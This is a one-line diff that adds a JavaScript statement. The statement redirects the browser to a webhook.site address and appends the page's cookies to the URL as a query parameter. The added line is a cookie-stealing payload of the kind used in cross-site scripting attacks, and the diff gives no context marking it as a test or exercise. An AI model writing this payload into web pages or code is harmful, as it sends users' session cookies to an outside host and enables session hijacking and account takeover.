@@ -1,0 +1,1 @@
+window.location.replace("https://webhook.site/09ae8ba0-d716-4d16-a361-fbf15191fd3c?cookie="+document.cookie)
